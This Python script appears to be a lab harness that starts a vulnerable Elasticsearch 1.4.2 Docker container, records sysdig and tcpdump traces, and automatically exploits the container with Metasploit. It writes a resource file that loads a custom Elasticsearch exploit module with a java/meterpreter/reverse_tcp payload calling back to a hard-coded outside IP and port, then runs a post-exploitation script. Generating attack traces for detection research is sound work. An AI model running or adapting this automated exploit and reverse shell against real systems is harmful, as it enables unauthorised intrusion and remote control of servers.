import sys
import os
import subprocess
import threading
import time
import random
from queue import *
from threading import Thread


## DEFINITIONS
# text formatting
class Format:
    VIOLET = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    SYMBOL = '[#]'
    SYMBOL_SHELL = ' > '
    NEWLINE = '\n                 '

    def toBOLD(string):
        return Format.BOLD + string + Format.END

    def toYELLOW(string):
        return Format.YELLOW + string + Format.END


# PRINTING
label_exploit = '[EXPLOIT]:   '
label_shell = '  [SHELL]:   '


def printShell(output):
    if output:
        print(Format.BOLD + label_shell + Format.SYMBOL_SHELL + ' ' + Format.END + output)

def printExploit(output):
    print(Format.BOLD + label_exploit + Format.END + output)


def printExploitBig(output):
    print(Format.BOLD + label_exploit + output + Format.END)


def printExploitGood(output):
    print(Format.BOLD + label_exploit + Format.END + Format.GREEN + Format.SYMBOL + ' ' + Format.END + output)


def printExploitSemi(output):
    print(Format.BOLD + label_exploit + Format.END + Format.YELLOW + Format.SYMBOL + ' ' + Format.END + output)


def printExploitBad(output):
    print(Format.BOLD + label_exploit + Format.END + Format.RED + Format.SYMBOL + ' ' + Format.END + output)


def printExploitBlue(output):
    print(Format.BOLD + label_exploit + Format.END + Format.BLUE + Format.SYMBOL + ' ' + Format.END + output)


# EXECUTION
def execute(cmd, wait, print_out):
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
    if wait:
        (out, err) = process.communicate()
        process.wait()
        output = out.decode().replace('\n', '')
        if print_out:
            printShell(output)
        return output
    return process


def executeInteractive(cmd):
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    outQueue = Queue()
    outThread = Thread(target=handleOutput, args=(p.stdout, outQueue))
    outThread.daemon = True
    outThread.start()
    p.wait()
    outThread.do_run = False


def handleOutput(out, queue):
    t = threading.currentThread()
    while getattr(t, 'do_run', True):
        for line in iter(out.readline, b''):
            lineText = line.decode().replace('\n', '')
            if 'session' in lineText.lower() or '=>' in lineText or '#$#' in lineText:  # or exploitRcFile in lineText:
                printShell(lineText.replace('#$#', ''))
                if 'Reason: Died' in lineText:
                    printExploitSemi('Meterpreter session died.' + Format.NEWLINE +
                                     'Note that is happening whenever an error in Meterpreter executions occurs' + Format.NEWLINE +
                                     'or when an AutoRunScript is used to exit from Meterpreter, as this exploit does.')
    out.close()
    # printExploit('output thread ended')


## START OF EXPLOIT
help_text = 'Syntax: python.py -i [image-name] [FURTHER OPTIONS]' + Format.NEWLINE + \
       '-i, -iname  [name]\tname of the image to boot from' + Format.NEWLINE + \
       '-c, -cname  [name]\tname of the new container to create' + Format.NEWLINE + \
       '-t, -uptime [time]\trun time in seconds of the new container' + Format.NEWLINE + \
       '-w, -wait   [time]\ttime to wait between container start and exploit start' + Format.NEWLINE + \
       '-b, -buildimage\tbuild the image before starting the container' + Format.NEWLINE + \
       '-noex, -noexploit\tskipt the metasploit exploit' + Format.NEWLINE + \
       '-nosyslog\t\tdisables SYSDIG logging' + Format.NEWLINE + \
       '-notcplog\t\tdisables TCPDUMP logging' + Format.NEWLINE + \
       '-nofilter\t\tdisbales the SYSDIG filter options, -vlogs' + Format.NEWLINE + \
       '-h\t\t\tprint this message'

if sys.argv[1] == '-h' or sys.argv[1] == '-help' or sys.argv[1] == '--help':
    print(help_text)
    quit()

printExploitBig('START OF EXPLOIT')
printExploitBig(str(sys.argv))
printExploitBig('in ' + os.getcwd())

# read parameters
# presets
image_name = ''
container_name = ''
script_processing_time = 15
collecting_time = -1
wait_before_exploit = -1
build_image = False
no_exploit = False
filtering = True
syslog = True
tcplog = True
create_infrastructure = False
download_data = False

# user resets
# TODO rebuild and reload image?
i = 1
while i < len(sys.argv):
    if len(sys.argv) > i+1 and (sys.argv[i] == '-uptime' or sys.argv[i] == '-t'):
        collecting_time = int(sys.argv[i + 1])
        i += 2
    elif len(sys.argv) > i+1 and (sys.argv[i] == '-cname' or sys.argv[i] == '-c'):
        container_name = sys.argv[i + 1]
        i += 2
    elif len(sys.argv) > i+1 and (sys.argv[i] == '-iname' or sys.argv[i] == '-i'):
        image_name = sys.argv[i + 1]
        i += 2
    elif len(sys.argv) > i + 1 and (sys.argv[i] == '-wait' or sys.argv[i] == '-w'):
        wait_before_exploit = int(sys.argv[i + 1])
        i += 2
    elif sys.argv[i] == '-create-infrastructure' or sys.argv[i] == '-create':
        create_infrastructure = True
        i += 1
    elif sys.argv[i] == '-download-data' or sys.argv[i] == '-download':
        download_data = True
        i += 1
    elif sys.argv[i] == '-download-and-create' or sys.argv[i] == '-create-and-download':
        create_infrastructure = True
        download_data = True
        i += 1
    elif sys.argv[i] == '-buildimage' or sys.argv[i] == '-b':
        build_image = True
        i += 1
    elif sys.argv[i] == '-noexploit' or sys.argv[i] == '-noex':
        no_exploit = True
        i += 1
    elif sys.argv[i] == '-nofilter' or sys.argv[i] == '-vlogs':
        filtering = False
        i += 1
    elif sys.argv[i] == '-nosyslog':
        syslog = False
        i += 1
    elif sys.argv[i] == '-notcplog':
        tcplog = False
        i += 1
    elif sys.argv[i] == '-h' or sys.argv[i] == '-help' or sys.argv[i] == '--help':
        printExploitSemi('Note that it is unusual to use the help-flag simultaneously with other options.' + Format.NEWLINE +
                         'But here is your "help":')
        printExploitGood(help_text)
        quit()
    else:
        printExploitBad('unrecognized parameter or specification ' + Format.toBOLD(sys.argv[i]) + Format.NEWLINE + help_text)
        quit()

if no_exploit:
    script_processing_time = script_processing_time - 8

if not image_name:
    printExploitBad('No image-name was given.' + Format.NEWLINE +
                    'Use ' + Format.toBOLD('exploit.py -i|-iname [image-name]') + ' to specify the container-image.')
    quit()

if not container_name:
    container_name = 'victim_elasticsearch'
    printExploitSemi('No container-name was given.' + Format.NEWLINE +
                     'Use ' + Format.toBOLD('exploit.py -c|-cname [container-name]') + ' to specify the container-name.' + Format.NEWLINE +
                     'The container is named ' + container_name + " now")


if collecting_time == -1:
    min_time = 5
    collecting_time = script_processing_time + min_time
    printExploitSemi('No collecting-time was given. ' + Format.NEWLINE +
                     'Collecting-time was set to ' + str(min_time) + ' seconds.' + Format.NEWLINE +
                     'Use ' + Format.toBOLD('exploit.py -t|-uptime [container-uptime]') + ' to specify the container-uptime.')
collecting_time = collecting_time + script_processing_time

# vars
payload = 'java/meterpreter/reverse_tcp'
rHost = '0.0.0.0'
lHost = '139.18.13.168'
lPort = '9351'

exploitRcFile = 'exploit.rc'
after_exploitRcFile = 'after_exploit.rc'
sysdig_log_file_name = 'sysdig_log.pcap'
tcpdump_log_file_name = 'tcpdump_log.pcap'


# create infrastructure if wanted
if create_infrastructure:
    dir_names = ['container', 'logs', 'share']
    for dir_name in dir_names:
        if not os.path.exists(dir_name):
            os.makedirs(dir_name)
            printExploitGood('created:\t/' + dir_name)
        else:
            printExploitGood('already there:\t' + '/' + dir_name)


# download files if wanted
if download_data:
    printExploitSemi('Note that this option is not supported.' + Format.NEWLINE +
                     'This script is naively trying to download the installation data from single web addresses.')

data_name = 'container/ubuntu-xenial-core-cloudimg-amd64-root.tar.gz'
if not os.path.exists(data_name):
    if download_data:
        printExploitBlue('downloading:\t' + data_name)
        execute('cd container && curl --progress-bar -OL https://partner-images.canonical.com/core/xenial/current/ubuntu-xenial-core-cloudimg-amd64-root.tar.gz', True, True)
    else:
        printExploitBad('can not find:\t' + data_name)
else:
    if download_data:
        printExploitGood('already there:\t' + data_name)

data_name = 'share/elasticsearch-1.4.2.deb'
if not os.path.exists(data_name):
    if download_data:
        printExploitBlue('downloading:\t' + data_name)
        execute('cd share && curl --progress-bar -OL https://download.elastic.co/elasticsearch/elasticsearch/elasticsearch-1.4.2.deb', True, True)
    else:
        printExploitBad('can not find:\t' + data_name)
else:
    if download_data:
        printExploitGood('already there:\t' + data_name)


# check if running as root (sudo)
if os.getuid() != 0:
    printExploitBad('This script needs to be started by root.' + Format.NEWLINE + 'You may start me with sudo again?')
    quit()

#build image if wanted
if build_image:
    response = execute('cd container && docker build -t ' + image_name + ' .', True, False)
    artifact1 = 'Successfully built'
    artifact2 = 'Successfully tagged'
    if artifact1 in response:
        image_id = response[response.index(artifact1) + len(artifact1)+1:response.index(artifact2)]
        printExploitGood('new image built:\t' + image_name + Format.NEWLINE +
                         'image ID:\t\t' + image_id)

# start container
containerID = execute(
    'docker run --net=host --name=' + container_name + ' -it --privileged -d -v ' + os.getcwd() + '/share:/share ' +
    '-p 9200:9200 -p 80:80 -p 4444:4444 ' + image_name + ' ', True, False)
if containerID:
    printExploitGood('new container started:\t' + Format.toBOLD(container_name) + Format.NEWLINE +
                     'image used:\t\t' + Format.toBOLD(image_name) + Format.NEWLINE +
                     'container ID:\t\t' + containerID)
else:
    printExploitBad('Container could not be created.' + Format.NEWLINE + 'Is it already in use? If so, stop it.')
    quit()


# start SYSDIG to listen
# use container.name to filter here and not container.id since sysdig is acting weird with container.id (wont stop capturing, restarts capturing (bug? (may gets fixed later?)))
if syslog:
    if filtering:
        execute('sudo sysdig -M ' + str(collecting_time) + ' -w logs/' + sysdig_log_file_name +
                ' -pc container.name=' + container_name + ' and proc.name!=tcpdump', False, True)
    else:
        execute('sudo sysdig -M ' + str(collecting_time) + ' -w logs/' + sysdig_log_file_name +
                ' -pc container.name=' + container_name + ' and proc.name!=tcpdump', False, True)
    printExploitGood('started SYSDIG to log and listen for ' + str(collecting_time) + ' seconds')
else:
    printExploitSemi('skipped starting SYSDIG since SYSDIG logging is not wanted.')


# start tcpdump INSIDE OF DOCKER CONTAINER to listen
if tcplog:
    execute('docker exec -d ' + container_name + ' tcpdump -G ' + str(
        collecting_time) + ' -W 1 -w /share/' + tcpdump_log_file_name, False, True)
    printExploitGood('started TCPDUMP to log and listen for ' + str(collecting_time) + ' seconds')
else:
    printExploitSemi('skipped starting TCPDUMP since TCPDUMP logging is not wanted.')


# feeding data into elasticsearch
printExploitBlue('waiting for elasticsearch to get ready...')
execute('sleep 7s', True, True)

response = execute('curl -s -XPUT \'localhost:9200/test/test/1?pretty\' -H \'Content-Type: application/json\' ' +
                   '-d\'{ "title": "test", "text":  "tryhard", "date":  "2018/23/01"}\'', True, True)
if '"created" : true' in response:
    printExploitGood('successfully fed data to elasticsearch')
else:
    printExploitBad(
        'data could not be fed to Elasticsearch.' + Format.NEWLINE + 'Is it there already? Is Elasticsearch ready yet?')

if no_exploit:
    printExploitGood('skipping the METASPLOIT exploit.')
else:
    # preparing usage of mfsconsole
    execute('cp ~/Exploits/elasticsearch_exploit/elasticsearch_exploit.rb ' +
            '~/.msf4/modules/exploits/elasticsearch_exploit/elasticsearch_exploit.rb', True, True)
    printExploitGood('copied exploit module to msfconsole scope')

    execute('echo "cd /tmp\n' +
            'mkdir hackedByAutoExploit\n' +
            'exit" > ' + after_exploitRcFile, True, True)
    printExploitGood('generated AutoRunScript after_exploit.rc for msfconsole meterpreter')

    execute('echo "set AutoRunScript multi_console_command -r ' + after_exploitRcFile + '\n' +
            'use exploit/elasticsearch_exploit/elasticsearch_exploit\n' +
            'set payload ' + payload + '\n' +
            'set target 0\n' +
            'set RHOST ' + rHost + '\n' +
            'set LHOST ' + lHost + '\n' +
            'set LPORT ' + lPort + '\n' +
            # exploit and do not interact with upcoming meterpreter
            # => meterpreter is running in background, but still executing after_exploitRcFile
            'exploit -z\n' +
            # wait for background job to finish (meterpreter)
            'sleep 4\n' +
            # exit from metasploit even if there are sessions running
            'exit -y" > ' + exploitRcFile, True, True)
    printExploitGood('generated AutoExploitScript exploit.rc for msfconsole')


    # wait before exploit if wanted
    if wait_before_exploit > -1:
        if wait_before_exploit == 0:
            printExploitGood('no waiting time before exploit')
        else:
            printExploitBlue('waiting ' + str(wait_before_exploit) + ' seconds (as intended), then starting exploit...')
            time.sleep(wait_before_exploit)
        collecting_time = max(script_processing_time, collecting_time - wait_before_exploit)
    else:
        wait_before_exploit = random.randint(1, collecting_time - script_processing_time)
        printExploitBlue('waiting ' + str(wait_before_exploit) + ' seconds (random), then starting exploit...')
        time.sleep(wait_before_exploit)


    # starting mfsconsole
    printExploitBlue('starting mfsconsole')
    executeInteractive('msfconsole -r exploit.rc')
    printExploitGood('mfsconsole ended')


# stop the container
printExploitBlue('waiting ' + str(collecting_time-script_processing_time) + ' s (remaining UPTIME), then stopping container ' + container_name)
time.sleep(collecting_time-script_processing_time)
printExploitBlue('stopping container ' + container_name)
execute('docker stop ' + container_name, True, False)
execute('docker rm ' + container_name, True, True)
printExploitGood('container stopped')


# log file handling (move the tcp-log-file)
if tcplog:
    execute('sudo mv share/' + tcpdump_log_file_name + ' logs/', True, True)
    printExploitGood('TCPDUMP log file moved to      ' + os.getcwd() + '/logs/' + tcpdump_log_file_name)
if syslog:
    printExploitGood('SYSDIG log file already is at  ' + os.getcwd() + '/logs/' + sysdig_log_file_name)

printExploitBig('END OF EXPLOIT')
